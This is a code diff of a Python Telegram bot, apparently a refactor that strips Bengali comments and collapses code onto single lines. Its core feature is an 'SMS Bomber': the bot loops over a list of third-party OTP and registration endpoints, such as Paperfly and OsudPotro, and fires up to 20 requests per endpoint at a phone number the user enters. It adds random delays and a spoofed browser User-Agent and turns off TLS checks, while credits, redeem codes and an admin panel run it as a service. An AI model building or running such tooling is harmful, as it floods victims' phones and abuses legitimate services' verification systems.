@@ -56,9 +56,9 @@ API_LIMITS = {
     "api_call_interval": 0.8,
     "max_retries": 3,
 }
-CANCEL_FLAG = {}   # {user_id: True/False} – বোম্বার থামানোর জন্য
+CANCEL_FLAG = {}
 
-# ===================== API লিস্ট (অপরিবর্তিত) =====================
+# ===================== API লিস্ট =====================
 WORKING_APIS = [
     {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
     {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
@@ -98,49 +98,24 @@ def check_success(text, status):
     return False
 
 async def get_user_status(user_id):
-    """ইউজার ব্যানড কিনা চেক করে"""
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
             return row[0] if row else "active"
 
 async def can_use_api(user_id):
-    """ডেইলি লিমিট চেক করে – True/False"""
     async with aiosqlite.connect(DB_PATH) as db:
         today = datetime.now().strftime('%Y-%m-%d')
-        async with db.execute(
-            "SELECT COUNT(*) FROM api_usage WHERE user_id = ? AND DATE(usage_time) = ?",
-            (user_id, today)
-        ) as cur:
+        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE user_id = ? AND DATE(usage_time) = ?", (user_id, today)) as cur:
             count = await cur.fetchone()
             return count[0] < API_LIMITS["per_user_limit"]
 
 async def track_api_usage(api_name, user_id, success):
     try:
         async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                """INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) 
-                   VALUES (?, 1, ?, ?) 
-                   ON CONFLICT(api_name) DO UPDATE SET 
-                   total_calls = total_calls + 1, 
-                   total_success = total_success + ?, 
-                   total_failed = total_failed + ?, 
-                   last_used = CURRENT_TIMESTAMP""",
-                (api_name, 1 if success else 0, 0 if success else 1,
-                 1 if success else 0, 0 if success else 1)
-            )
-            await db.execute(
-                """INSERT INTO user_api_stats (user_id, api_name, total_calls) 
-                   VALUES (?, ?, 1) 
-                   ON CONFLICT(user_id, api_name) DO UPDATE SET 
-                   total_calls = total_calls + 1, 
-                   last_used = CURRENT_TIMESTAMP""",
-                (user_id, api_name)
-            )
-            await db.execute(
-                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)",
-                (api_name, user_id, 1 if success else 0)
-            )
+            await db.execute("INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) VALUES (?, 1, ?, ?) ON CONFLICT(api_name) DO UPDATE SET total_calls = total_calls + 1, total_success = total_success + ?, total_failed = total_failed + ?, last_used = CURRENT_TIMESTAMP", (api_name, 1 if success else 0, 0 if success else 1, 1 if success else 0, 0 if success else 1))
+            await db.execute("INSERT INTO user_api_stats (user_id, api_name, total_calls) VALUES (?, ?, 1) ON CONFLICT(user_id, api_name) DO UPDATE SET total_calls = total_calls + 1, last_used = CURRENT_TIMESTAMP", (user_id, api_name))
+            await db.execute("INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)", (api_name, user_id, 1 if success else 0))
             await db.commit()
     except Exception as e:
         logger.error(f"Track API error: {e}")
@@ -148,18 +123,14 @@ async def track_api_usage(api_name, user_id, success):
 async def admin_log(admin_id, action, target_id=None, details=""):
     try:
         async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
-                (admin_id, action, target_id, details)
-            )
+            await db.execute("INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)", (admin_id, action, target_id, details))
             await db.commit()
     except Exception as e:
         logger.error(f"Admin log error: {e}")
 
 async def backup_database():
-    """প্রতি ৬ ঘণ্টা পর ডেটাবেস ব্যাকআপ নেয় (ব্যাকগ্রাউন্ড টাস্ক)"""
     while True:
-        await asyncio.sleep(21600)  # ৬ ঘণ্টা
+        await asyncio.sleep(21600)
         try:
             backup_file = os.path.join(BACKUP_DIR, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
             shutil.copy2(DB_PATH, backup_file)
@@ -169,67 +140,32 @@ async def backup_database():
 
 # ===================== কীবোর্ড =====================
 def get_main_keyboard():
-    keyboard = [
-        ["📨 Send SMS", "💣 SMS Bomber"],
-        ["👤 My Profile", "🎁 Redeem Code"],
-        ["📊 My Stats", "📞 Contact Admin"]
-    ]
+    keyboard = [["📨 Send SMS", "💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats", "📞 Contact Admin"]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 def get_admin_keyboard():
-    keyboard = [
-        ["💰 Add Credit", "➖ Remove Credit"],
-        ["🚫 Ban User", "✅ Unban User"],
-        ["📣 Broadcast", "🎟️ Create Code"],
-        ["📊 Live Stats", "📈 API Stats"],
-        ["👥 Users List", "🏆 Top Users"],
-        ["💰 Total Balance", "📋 API List"],
-        ["🔄 Reset Limits", "📤 Export Data"],
-        ["🗑️ Clear Logs", "📜 Admin Logs"],
-        ["⏹ Cancel Bomb", "🔙 Back"]
-    ]
+    keyboard = [["💰 Add Credit", "➖ Remove Credit"], ["🚫 Ban User", "✅ Unban User"], ["📣 Broadcast", "🎟️ Create Code"], ["📊 Live Stats", "📈 API Stats"], ["👥 Users List", "🏆 Top Users"], ["💰 Total Balance", "📋 API List"], ["🔄 Reset Limits", "📤 Export Data"], ["🗑️ Clear Logs", "📜 Admin Logs"], ["⏹ Cancel Bomb", "🔙 Back"]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 def get_back_keyboard():
-    keyboard = [["🔙 Back"]]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)
 
 def get_bombing_keyboard():
-    keyboard = [["⏹ Cancel Bomb"]]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    return ReplyKeyboardMarkup([["⏹ Cancel Bomb"]], resize_keyboard=True)
 
 # ===================== স্টার্ট =====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     username = user.username or user.first_name
-
     async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute(
-            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
-            (user_id, username)
-        )
+        await db.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
         await db.commit()
-
     if user_id == ADMIN_ID:
-        await update.message.reply_text(
-            f"👑 **Admin Panel**\n\nWelcome Admin {user.first_name}!\n🆔 ID: `{user_id}`\n\n📌 Select an option:",
-            parse_mode="Markdown",
-            reply_markup=get_admin_keyboard()
-        )
+        await update.message.reply_text(f"👑 **Admin Panel**\n\nWelcome Admin {user.first_name}!\n🆔 ID: `{user_id}`\n\n📌 Select an option:", parse_mode="Markdown", reply_markup=get_admin_keyboard())
         return
+    await update.message.reply_text(f"🔥 **Welcome {user.first_name}!**\n\n🆔 ID: `{user_id}`\n💰 Balance: 10 Credits\n📡 APIs: {len(WORKING_APIS)}\n\n📌 **Select an option:**", parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-    await update.message.reply_text(
-        f"🔥 **Welcome {user.first_name}!**\n\n"
-        f"🆔 ID: `{user_id}`\n"
-        f"💰 Balance: 10 Credits\n"
-        f"📡 APIs: {len(WORKING_APIS)}\n\n"
-        f"📌 **Select an option:**",
-        parse_mode="Markdown",
-        reply_markup=get_main_keyboard()
-    )
-
-# ===================== ইউজার স্ট্যাটাস চেক (ডেকোরেটর) =====================
 async def check_status(func):
     async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
         user_id = update.effective_user.id
@@ -240,33 +176,19 @@ async def check_status(func):
         return await func(update, context, *args, **kwargs)
     return wrapper
 
-# ===================== এসএমএস সেন্ড =====================
 @check_status
 async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not await can_use_api(user_id):
-        await update.message.reply_text(
-            f"❌ **Daily limit exceeded!**\nMax: {API_LIMITS['per_user_limit']}/day",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text(f"❌ **Daily limit exceeded!**\nMax: {API_LIMITS['per_user_limit']}/day", parse_mode="Markdown")
         return
-
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
             if not row or row[0] < 1:
-                await update.message.reply_text(
-                    f"❌ **Insufficient credits!**\n💰 Balance: {row[0] if row else 0}\n👨‍💻 Contact: @{ADMIN_USERNAME}",
-                    parse_mode="Markdown",
-                    reply_markup=get_main_keyboard()
-                )
+                await update.message.reply_text(f"❌ **Insufficient credits!**\n💰 Balance: {row[0] if row else 0}\n👨‍💻 Contact: @{ADMIN_USERNAME}", parse_mode="Markdown", reply_markup=get_main_keyboard())
                 return
-
-    await update.message.reply_text(
-        "📨 **Send SMS**\n\nEnter phone number:\nExample: `018XXXXXXXX`\n💰 Cost: 1 Credit",
-        parse_mode="Markdown",
-        reply_markup=get_back_keyboard()
-    )
+    await update.message.reply_text("📨 **Send SMS**\n\nEnter phone number:\nExample: `018XXXXXXXX`\n💰 Cost: 1 Credit", parse_mode="Markdown", reply_markup=get_back_keyboard())
     context.user_data['state'] = 'sms_number'
 
 async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -286,9 +208,7 @@ async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
         context.user_data.clear()
         return
-
     await update.message.reply_text(f"⏳ Sending SMS to `{number}`...", parse_mode="Markdown")
-
     success = False
     response_text = ""
     try:
@@ -306,33 +226,22 @@ async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         response_text = str(e)
         logger.error(f"SMS error: {e}")
-
     if success:
         async with aiosqlite.connect(DB_PATH) as db:
             await db.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
             await db.commit()
-        await update.message.reply_text(
-            f"✅ **SMS Sent Successfully!**\n\n📱 Number: `{number}`\n💰 1 Credit deducted",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
-        )
+        await update.message.reply_text(f"✅ **SMS Sent Successfully!**\n\n📱 Number: `{number}`\n💰 1 Credit deducted", parse_mode="Markdown", reply_markup=get_main_keyboard())
     else:
         await update.message.reply_text(f"❌ **Failed!**\nError: `{response_text[:100]}`", parse_mode="Markdown", reply_markup=get_main_keyboard())
     context.user_data.clear()
 
-# ===================== এসএমএস বোম্বার =====================
 @check_status
 async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not await can_use_api(user_id):
         await update.message.reply_text(f"❌ **Daily limit exceeded!**\nMax: {API_LIMITS['per_user_limit']}/day", parse_mode="Markdown")
         return
-
-    await update.message.reply_text(
-        "💣 **SMS Bomber**\n\nEnter target number:\nExample: `018XXXXXXXX`\n📡 APIs: {len(WORKING_APIS)}\n⚠️ Max 20 per API",
-        parse_mode="Markdown",
-        reply_markup=get_bombing_keyboard()
-    )
+    await update.message.reply_text(f"💣 **SMS Bomber**\n\nEnter target number:\nExample: `018XXXXXXXX`\n📡 APIs: {len(WORKING_APIS)}\n⚠️ Max 20 per API", parse_mode="Markdown", reply_markup=get_bombing_keyboard())
     context.user_data['state'] = 'bomber_number'
 
 async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -342,24 +251,17 @@ async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     context.user_data['bomber_number'] = number
     context.user_data['state'] = 'bomber_amount'
-    await update.message.reply_text(
-        f"✅ Number: `{number}`\n\n💥 **Enter amount (1-20 per API):**\n📊 Total: {len(WORKING_APIS)} x amount",
-        parse_mode="Markdown",
-        reply_markup=get_bombing_keyboard()
-    )
+    await update.message.reply_text(f"✅ Number: `{number}`\n\n💥 **Enter amount (1-20 per API):**\n📊 Total: {len(WORKING_APIS)} x amount", parse_mode="Markdown", reply_markup=get_bombing_keyboard())
 
 async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     number = context.user_data.get('bomber_number')
     text = update.message.text.strip()
-
-    # ক্যান্সেল চেক
     if text == "⏹ Cancel Bomb":
         CANCEL_FLAG[user_id] = True
         await update.message.reply_text("⏹ **Bombing cancelled!**", parse_mode="Markdown", reply_markup=get_main_keyboard())
         context.user_data.clear()
         return
-
     try:
         amount = int(text)
         if amount < 1 or amount > 20:
@@ -368,31 +270,21 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_bombing_keyboard())
         return
-
     if not number:
         await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
         context.user_data.clear()
         return
-
     total_apis = len(WORKING_APIS)
     total_sms = total_apis * amount
-
-    msg = await update.message.reply_text(
-        f"⏳ **Bombing Started!**\n\n📱 Target: `{number}`\n📡 APIs: {total_apis}\n💥 Per API: {amount}\n📊 Total: {total_sms}\n\n(Click ⏹ Cancel Bomb to stop)",
-        parse_mode="Markdown",
-        reply_markup=get_bombing_keyboard()
-    )
-
+    msg = await update.message.reply_text(f"⏳ **Bombing Started!**\n\n📱 Target: `{number}`\n📡 APIs: {total_apis}\n💥 Per API: {amount}\n📊 Total: {total_sms}\n\n(Click ⏹ Cancel Bomb to stop)", parse_mode="Markdown", reply_markup=get_bombing_keyboard())
     success_count = 0
     failed_count = 0
     api_results = []
     CANCEL_FLAG[user_id] = False
-
     ssl_context = ssl.create_default_context()
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_NONE
     connector = aiohttp.TCPConnector(ssl=ssl_context)
-
     async with aiohttp.ClientSession(connector=connector) as session:
         for i, api in enumerate(WORKING_APIS, 1):
             if CANCEL_FLAG.get(user_id, False):
@@ -404,13 +296,7 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     break
                 try:
                     body = replace_phone(api['body'], number)
-                    headers = {
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                        "Accept": "application/json",
-                        "Content-Type": "application/json",
-                        "Accept-Encoding": "gzip, deflate, br",
-                        "Connection": "keep-alive"
-                    }
+                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
                     await asyncio.sleep(random.uniform(0.8, 1.5))
                     if api['method'] == 'POST':
                         async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
@@ -429,27 +315,17 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             else:
                                 api_failed += 1
                                 failed_count += 1
-                except asyncio.TimeoutError:
+                except:
                     api_failed += 1
                     failed_count += 1
-                except Exception as e:
-                    api_failed += 1
-                    failed_count += 1
-                    logger.error(f"API error {api['name']}: {e}")
-
                 total_done = (i-1)*amount + (j+1)
                 if total_done % 10 == 0 or total_done == total_sms:
                     try:
-                        await msg.edit_text(
-                            f"⏳ **Bombing...**\n\n📱 Target: `{number}`\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Progress: {total_done}/{total_sms}",
-                            parse_mode="Markdown",
-                            reply_markup=get_bombing_keyboard()
-                        )
+                        await msg.edit_text(f"⏳ **Bombing...**\n\n📱 Target: `{number}`\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Progress: {total_done}/{total_sms}", parse_mode="Markdown", reply_markup=get_bombing_keyboard())
                     except:
                         pass
             api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
             await track_api_usage(api['name'], user_id, api_success > 0)
-
     success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
     top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
     top_apis_text = ""
@@ -458,15 +334,11 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
             top_apis_text += f"{idx}. {api['name']}: ✅{api['success']}\n"
     if not top_apis_text:
         top_apis_text = "❌ No successful APIs!"
-
-    result_message = (
-        f"✅ **Bombing Complete!**\n\n📱 Target: `{number}`\n📡 APIs Used: {total_apis}\n💥 Total Sent: {total_sms}\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Success Rate: {success_rate}%\n\n🏆 **Top 10 APIs:**\n{top_apis_text}"
-    )
+    result_message = f"✅ **Bombing Complete!**\n\n📱 Target: `{number}`\n📡 APIs Used: {total_apis}\n💥 Total Sent: {total_sms}\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Success Rate: {success_rate}%\n\n🏆 **Top 10 APIs:**\n{top_apis_text}"
     await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
     context.user_data.clear()
     CANCEL_FLAG.pop(user_id, None)
 
-# ===================== প্রোফাইল =====================
 @check_status
 async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -474,13 +346,8 @@ async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
         async with db.execute("SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
     if row:
-        await update.message.reply_text(
-            f"👤 **My Profile**\n\n🆔 ID: `{user_id}`\n👤 Username: {row[0] or 'N/A'}\n💰 Balance: {row[1]}\n📨 SMS Sent: {row[2]}\n💣 Bombing Done: {row[3]}\n🚦 Status: {row[5].capitalize()}\n📅 Joined: {row[4][:10] if row[4] else 'N/A'}",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
-        )
+        await update.message.reply_text(f"👤 **My Profile**\n\n🆔 ID: `{user_id}`\n👤 Username: {row[0] or 'N/A'}\n💰 Balance: {row[1]}\n📨 SMS Sent: {row[2]}\n💣 Bombing Done: {row[3]}\n🚦 Status: {row[5].capitalize()}\n📅 Joined: {row[4][:10] if row[4] else 'N/A'}", parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-# ===================== স্ট্যাটস =====================
 @check_status
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -488,13 +355,8 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         async with db.execute("SELECT balance, total_sms, total_bombing FROM users WHERE user_id = ?", (user_id,)) as cur:
             row = await cur.fetchone()
     if row:
-        await update.message.reply_text(
-            f"📊 **My Stats**\n\n💰 Balance: {row[0]}\n📨 SMS Sent: {row[1]}\n💣 Bombing Done: {row[2]}\n📡 Total APIs: {len(WORKING_APIS)}",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
-        )
+        await update.message.reply_text(f"📊 **My Stats**\n\n💰 Balance: {row[0]}\n📨 SMS Sent: {row[1]}\n💣 Bombing Done: {row[2]}\n📡 Total APIs: {len(WORKING_APIS)}", parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-# ===================== রিডিম =====================
 @check_status
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🎟 **Enter Redeem Code:**\n\nAvailable: `FREE50`, `WELCOME10`", parse_mode="Markdown", reply_markup=get_back_keyboard())
@@ -523,19 +385,10 @@ async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🎉 **Code Redeemed!**\n✅ +{amount} Credits!", parse_mode="Markdown", reply_markup=get_main_keyboard())
     context.user_data.clear()
 
-# ===================== কন্টাক্ট =====================
 async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("📩 Message Admin", url=f"https://t.me/{ADMIN_USERNAME}")],
-        [InlineKeyboardButton("📢 Support", url=f"https://t.me/{ADMIN_USERNAME}")]
-    ]
-    await update.message.reply_text(
-        f"📞 **Contact**\n\n👨‍💻 Admin: @{ADMIN_USERNAME}\n👨‍💻 Owner: @{OWNER_USERNAME}\n\n📌 Click the button below:",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    keyboard = [[InlineKeyboardButton("📩 Message Admin", url=f"https://t.me/{ADMIN_USERNAME}")], [InlineKeyboardButton("📢 Support", url=f"https://t.me/{ADMIN_USERNAME}")]]
+    await update.message.reply_text(f"📞 **Contact**\n\n👨‍💻 Admin: @{ADMIN_USERNAME}\n👨‍💻 Owner: @{OWNER_USERNAME}\n\n📌 Click the button below:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# ===================== অ্যাডমিন ফাংশনসমূহ (শুধু গুরুত্বপূর্ণ) =====================
 async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     await update.message.reply_text("💰 **Add Credit**\n\nEnter user ID and amount:\nExample: `1967494059 50`", parse_mode="Markdown", reply_markup=get_back_keyboard())
@@ -571,11 +424,7 @@ async def admin_total_balance(update: Update, context: ContextTypes.DEFAULT_TYPE
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT SUM(balance), COUNT(*), AVG(balance) FROM users") as cur:
             total, users, avg = await cur.fetchone()
-    await update.message.reply_text(
-        f"💰 **Total Balance**\n\n👥 Users: {users}\n💰 Total: {total or 0}\n📊 Avg: {round(avg or 0, 2)}",
-        parse_mode="Markdown",
-        reply_markup=get_admin_keyboard()
-    )
+    await update.message.reply_text(f"💰 **Total Balance**\n\n👥 Users: {users}\n💰 Total: {total or 0}\n📊 Avg: {round(avg or 0, 2)}", parse_mode="Markdown", reply_markup=get_admin_keyboard())
 
 async def admin_top_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
@@ -692,19 +541,16 @@ async def admin_cancel_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     CANCEL_FLAG[user_id] = True
     await update.message.reply_text("⏹ **Bombing cancelled by admin!**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
 
-# ===================== অ্যাডমিন স্টেট হ্যান্ডলার =====================
 async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     message = update.message.text
     state = context.user_data.get('admin_state')
-
     if state == 'add_credit':
         try:
             target, amount = map(int, message.split())
             async with aiosqlite.connect(DB_PATH) as db:
                 await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target))
                 await db.commit()
-            # ইউজারকে নোটিফিকেশন
             try:
                 await context.bot.send_message(target, f"🎉 **Admin added {amount} credits!**\n💰 New balance: +{amount}", parse_mode="Markdown")
             except: pass
@@ -713,7 +559,6 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         except:
             await update.message.reply_text("❌ Invalid! Use: `ID AMOUNT`", parse_mode="Markdown")
         context.user_data['admin_state'] = None
-
     elif state == 'remove_credit':
         try:
             target, amount = map(int, message.split())
@@ -728,7 +573,6 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         except:
             await update.message.reply_text("❌ Invalid! Use: `ID AMOUNT`", parse_mode="Markdown")
         context.user_data['admin_state'] = None
-
     elif state == 'ban_user':
         try:
             target = int(message.strip())
@@ -743,7 +587,6 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         except:
             await update.message.reply_text("❌ Invalid ID!", reply_markup=get_admin_keyboard())
         context.user_data['admin_state'] = None
-
     elif state == 'unban_user':
         try:
             target = int(message.strip())
@@ -758,7 +601,6 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         except:
             await update.message.reply_text("❌ Invalid ID!", reply_markup=get_admin_keyboard())
         context.user_data['admin_state'] = None
-
     elif state == 'broadcast':
         broadcast_text = message
         async with aiosqlite.connect(DB_PATH) as db:
@@ -775,7 +617,6 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         await admin_log(user_id, "Broadcast", None, f"Sent to {success} users")
         await update.message.reply_text(f"✅ Broadcast sent to {success} users!", reply_markup=get_admin_keyboard())
         context.user_data['admin_state'] = None
-
     elif state == 'create_code':
         try:
             parts = message.split()
@@ -791,13 +632,10 @@ async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             await update.message.reply_text("❌ Invalid! Use: `CODE AMOUNT USAGES`", parse_mode="Markdown")
         context.user_data['admin_state'] = None
 
-# ===================== মেসেজ হ্যান্ডলার =====================
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     message = update.message.text
     logger.info(f"📩 Message from {user_id}: {message}")
-
-    # অ্যাডমিন কমান্ড
     if user_id == ADMIN_ID:
         if message == "⏹ Cancel Bomb":
             await admin_cancel_bomb(update, context)
@@ -822,18 +660,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("🏠 Main Menu", reply_markup=get_main_keyboard())
             context.user_data.clear()
             return
-
         if context.user_data.get('admin_state'):
             await admin_state_handler(update, context)
             return
-
-    # ব্যাক
     if message == "🔙 Back":
         await update.message.reply_text("🏠 **Main Menu**", parse_mode="Markdown", reply_markup=get_main_keyboard())
         context.user_data.clear()
         return
-
-    # মেইন মেনু
     if message == "📨 Send SMS":
         await cmd_sms(update, context); return
     if message == "💣 SMS Bomber":
@@ -846,8 +679,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await stats(update, context); return
     if message == "📞 Contact Admin":
         await contact(update, context); return
-
-    # স্টেট প্রসেস
     state = context.user_data.get('state')
     if state == 'sms_number':
         await sms_number(update, context); return
@@ -859,43 +690,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await bomber_amount(update, context); return
     elif state == 'redeem_code':
         await redeem_process(update, context); return
-
     await update.message.reply_text("❌ **Please use the buttons below:**", parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-# ===================== ডাটাবেস ইনিশিয়ালাইজ =====================
 async def init_db():
     try:
         async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("""CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10,
-                total_sms INTEGER DEFAULT 0, total_bombing INTEGER DEFAULT 0,
-                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active'
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
-                code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
-                user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                PRIMARY KEY (user_id, code)
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS api_usage (
-                id INTEGER PRIMARY KEY AUTOINCREMENT, api_name TEXT, user_id INTEGER,
-                success INTEGER, usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (
-                api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0,
-                total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0,
-                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (
-                user_id INTEGER, api_name TEXT, total_calls INTEGER DEFAULT 0,
-                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, api_name)
-            )""")
-            await db.execute("""CREATE TABLE IF NOT EXISTS admin_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, action TEXT,
-                target_id INTEGER, details TEXT, log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )""")
+            await db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10, total_sms INTEGER DEFAULT 0, total_bombing INTEGER DEFAULT 0, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')")
+            await db.execute("CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+            await db.execute("CREATE TABLE IF NOT EXISTS redeem_history (user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, code))")
+            await db.execute("CREATE TABLE IF NOT EXISTS api_usage (id INTEGER PRIMARY KEY AUTOINCREMENT, api_name TEXT, user_id INTEGER, success INTEGER, usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+            await db.execute("CREATE TABLE IF NOT EXISTS api_stats (api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0, total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
